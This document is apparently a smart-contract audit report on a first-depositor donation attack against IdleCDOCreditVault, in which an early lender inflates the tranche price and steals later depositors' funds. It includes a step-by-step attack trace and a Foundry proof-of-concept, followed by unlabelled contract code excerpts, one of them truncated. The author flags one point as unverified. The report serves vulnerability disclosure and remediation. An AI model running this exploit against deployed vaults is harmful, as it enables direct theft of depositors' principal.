### Title
First-depositor donation inflates `priceAA`/`priceBB`, letting an early KYC'd lender steal later depositors' principal - (File: contracts/IdleCDOCreditVault.sol)

### Summary
`_tranchePrice` returns `oneToken` when the tranche supply is 0, so the very first deposit mints ~1 wei of tranche tokens per wei of underlying at a fixed 1:1 price. Because `getContractValue()` counts the raw `token` balance held by the CDO, an attacker can then donate underlyings directly to the contract; the next `_updateAccounting()` treats the donation as gain and pushes the entire amount into the attacker-dominated tranche's price. Subsequent depositors mint shares at the inflated price and receive near-zero tranche tokens, while the attacker's dust share redeems for essentially the whole NAV.

### Finding Description
- `IdleCDOCreditVault._deposit` updates accounting, pulls the underlying, and mints shares via `_mintSharesAtCurrPrice` at `_tranchePrice(_tranche)` [1](#0-0) 
- When `trancheSupply == 0`, `_tranchePrice` returns `oneToken`, so a 1-wei first deposit mints ~1 wei of tranche tokens [2](#0-1) 
- `getContractValue()` = `balance(strategyToken) + balance(token) - unclaimedFees`, i.e. unsolicited `token` donations are fully counted in NAV [3](#0-2) 
- `_updateAccounting` feeds `getContractValue()` into `_virtualPriceAux`; when only one tranche class exists (`_lastNAV == _lastTrancheNAV`), the entire donated "gain" accrues to that tranche's price [4](#0-3) 
- The defensive view `_managedContractValue()` excludes raw token balance precisely because donations pollute NAV, but it is only used by `virtualPrice`; the mint path still uses `getContractValue()`, so donations are not actually neutralized [5](#0-4) 
- Withdrawals pay `shares * priceAA / ONE_TRANCHE_TOKEN` via `_withdrawOps`, so the attacker's 1-wei share at an inflated `priceAA` sweeps the victim's deposited NAV [6](#0-5) 

Attack trace (buffer phase, credit vault, AA-only):
1. Attacker (KYC-passing lender) calls `depositAA(1)` → 1 wei AA tranche, `lastNAVAA = 1`, `priceAA = 1e18`.
2. Attacker `token.transfer(cdo, D)` with `D = 10_000e18`.
3. Attacker (or any user) calls `depositAA`/`withdrawAA`/`updateAccounting` — `_updateAccounting` sees `nav = 1 + D`, `lastNAV = 1`, and assigns ~`D` to AA → `priceAA ≈ D * 1e18 / 1 wei`.
4. Victim calls `depositAA(V)` → mints `V * 1e18 / priceAA ≈ V / D` shares (~dust for `V << D`), while `lastNAVAA += V`.
5. Attacker calls `withdrawAA(1)` → redeems `priceAA / 1e18 ≈ D + V` underlyings (bounded by balance), stealing `V`.

### Impact Explanation
Direct theft of future depositors' principal: a victim depositing `V` receives ≈ `V/D` shares and loses nearly all of `V` to the attacker's redemption. The loss is bounded only by the contract's token/strategy-token liquidity, so the attacker extracts `min(V, available balance)` per victim.

### Likelihood Explanation
Requires being the first depositor of a tranche class (guaranteed at vault launch before other lenders enter) plus a donation sized relative to expected deposits. Only needs KYC (unprivileged lender), no privileged role. The `virtualPrice` view partially masks it but `_updateAccounting`/`getContractValue` do not skim or exclude donated raw tokens, and no minimum-first-mint or dead-share reserve exists, so nothing in the guards (`_guarded`, `_checkNotAuthorized`, pause flags) stops it.

### Recommendation
- Mint a minimum initial tranche amount and/or lock a dead-share reserve (e.g., mint first-deposit shares to `address(1)` or the DAO) so `trancheSupply` is never ~1 wei against an attacker-controlled NAV.
- Alternatively, skim unsolicited `token` donations out of `getContractValue()` for accounting purposes (use `_managedContractValue()` inside `_updateAccounting`, or sweep stray underlying before computing gain), so donations cannot move `priceAA`/`priceBB`.

### Proof of Concept
Foundry fork PoC sketch (credit vault with USDC-like `token`, KYC'd attacker):

```solidity
// setup: deploy IdleCDOCreditVault + strategy, whitelist attacker & victim
uint256 D = 10_000e6;
uint256 V = 1_000e6;

// 1) first deposit: 1 wei
vm.prank(attacker); cdo.depositAA(1);            // mints ~1 wei AA, priceAA stays 1e18

// 2) donation
vm.prank(attacker); token.transfer(address(cdo), D);

// 3) crystallize inflated price (any interaction)
vm.prank(attacker); cdo.depositAA(1);            // _updateAccounting prices AA at ~D
assertGt(cdo.priceAA(), D * 1e18 / 1e6);         // inflated

// 4) victim deposits, gets dust
vm.prank(victim); uint256 minted = cdo.depositAA(V);
assertLt(minted, V * 1e18 / cdo.priceAA() + 1);  // ~ V/D shares

// 5) attacker redeems dust share for ~D + V
uint256 balBefore = token.balanceOf(attacker);
vm.prank(attacker); cdo.withdrawAA(IERC20(cdo.AATranche()).balanceOf(attacker));
assertGt(token.balanceOf(attacker) - balBefore, D + V - 10); // steals victim principal
```

Uncertain point I could not fully verify within the iteration limit: whether any variant (e.g., `IdleCDOEpochVariant`) routes `_deposit`/`_updateAccounting` through a donation-skim helper that would neutralize step 3. The presence of `_managedContractValue()` (which exists specifically because `getContractValue()` double-counts unsolicited raw tokens, and which is *not* used in the accounting path) strongly indicates donations do reach NAV, but a skim call inside a child override of `_updateAccounting` or the withdraw path in the epoch variant was not fully traced. If such a skim exists, the finding reduces in severity but the zero-supply fixed-price first mint remains a latent risk.

    // Remove performance fee for gains
    if (totalGain > 0) {
      totalGain -= totalGain * int256(fee) / int256(FULL_ALLOC);
    }

    bool _isAATranche = _tranche == AATranche;
    // A class with no saved NAV cannot be revived by later gains. If only this class has saved
    // NAV, it receives the full gain or loss; otherwise both classes participate.
    if (_lastTrancheNAV == 0) {
      _totalTrancheGain = 0;
    } else if (_lastNAV == _lastTrancheNAV) {
      _totalTrancheGain = totalGain;
    } else {
      if (totalGain > 0) {
        // Split the net gain, according to _trancheAPRSplitRatio, with precision loss favoring the AA tranche.
        int256 totalBBGain = totalGain * int256(FULL_ALLOC - _trancheAPRSplitRatio) / int256(FULL_ALLOC);
        // The new NAV for the tranche is old NAV + total gain for the tranche
        _totalTrancheGain = _isAATranche ? (totalGain - totalBBGain) : totalBBGain;
      } else {
        int256 maxBBLoss = -int256(lastNAVBB);
        int256 totalBBLoss = totalGain > maxBBLoss ? totalGain : maxBBLoss;
        _totalTrancheGain = _isAATranche ? totalGain - totalBBLoss : totalBBLoss;
      }
    }
    // Split the new NAV (_lastTrancheNAV + _totalTrancheGain) per tranche token
    _virtualPrice = uint256(int256(_lastTrancheNAV) + _totalTrancheGain) * ONE_TRANCHE_TOKEN / trancheSupply;

  /// @notice Burn tranche tokens and update NAV and trancheAPRSplitRatio
  /// @param _amount Amount of tranche tokens
  /// @param _underlyings Amount of underlyings
  /// @param _tranche Tranche to withdraw from
  function _withdrawOps(uint256 _amount, uint256 _underlyings, address _tranche) internal {
    // burn tranche token
    IdleCDOTranche(_tranche).burn(msg.sender, _amount);

    // update NAV with the _amount of underlyings removed
    if (_tranche == AATranche) {
      lastNAVAA -= _underlyings;
    } else {
      lastNAVBB -= _underlyings;
    }

    // update trancheAPRSplitRatio
    _updateSplitRatio(_getAARatio(true));
  }
